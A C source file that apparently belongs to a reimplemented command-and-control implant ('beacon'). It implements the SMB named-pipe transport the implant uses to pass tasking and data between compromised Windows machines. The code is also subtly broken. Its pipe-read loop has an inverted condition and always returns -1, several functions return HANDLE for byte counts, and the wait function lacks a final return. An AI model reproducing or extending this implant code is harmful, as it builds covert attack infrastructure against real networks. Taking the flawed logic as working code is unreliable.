#include "pch.h"

#include "protocol.h"

#include "beacon.h"



HANDLE ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
{
	DWORD totalRead = 0;

	if (length <= 0)
	{
		if (totalRead != length)
			totalRead = -1;

		return totalRead;
	}

	DWORD read = 0;
	while (ReadFile(channel, &buffer[totalRead], length - totalRead, &read, NULL) && !read && totalRead < length) {
		totalRead += read;
	}

	return -1;
}

BOOL ProtocolSmbPipeWrite(HANDLE hFile, char* buffer, int length)
{
    DWORD wrote;

    // Check if size is greater than 0
    for (DWORD totalWrote = 0; totalWrote < length; totalWrote += wrote) {
        // Calculate the number of bytes to be written in the current iteration
        const DWORD toWrite = min(length - totalWrote, 0x2000);


        // Check if the write operation was successful
        if (!WriteFile(hFile, buffer + totalWrote, toWrite, &wrote, NULL)) {
            return FALSE;
        }
    }

    return TRUE;
}

char* ProtocolHeaderGet(char* setting, int headerSize, int* pHeaderLength)
{
	datap parser;
	BeaconDataParse(&parser, setting, headerSize);
	SHORT headerLength = BeaconDataShort(&parser);
	*pHeaderLength = headerLength;
	char* header = BeaconDataPtr(&parser, headerLength);
	*(int*)(header + *pHeaderLength - sizeof(int)) = headerSize;
	return header;
}

HANDLE ProtocolSmbRead(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(buffer, 0, &headerSize);
	int totalHeaderRead = ProtocolSmbPipeRead(protocol->channel.handle, header, headerSize);
	if (totalHeaderRead == -1 || totalHeaderRead != headerSize)
		return -1;

	int dataSize = *(int*)(header + headerSize - sizeof(int));
	if ( dataSize < 0 || dataSize > length)
		return -1;

	return ProtocolSmbPipeRead(protocol->channel.handle, buffer, dataSize);
}


BOOL ProtocolSmbWrite(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(buffer, length, &headerSize);
	if (!ProtocolSmbPipeWrite(protocol->channel.handle, header, headerSize))
		return FALSE;

	return ProtocolSmbPipeWrite(protocol->channel.handle, buffer, length);
}

void ProtocolSmbClose(PROTOCOL* protocol)
{
	DisconnectNamedPipe(protocol->channel.handle);
	CloseHandle(protocol->channel.handle);
}

BOOL ProtocolSmbFlush(PROTOCOL* protocol)
{
	return FlushFileBuffers(protocol->channel.handle);
}

BOOL ProtocolSmbPipeWaitForData(PROTOCOL* protocol, DWORD waitTime)
{
	DWORD timeout = GetTickCount() + waitTime;
	DWORD available;

	while (GetTickCount() < timeout)
	{
		if (!PeekNamedPipe(protocol->channel.handle, NULL, 0, NULL, &available, NULL))
			return FALSE;

		if (available)
			return TRUE;

		Sleep(10);
	}
}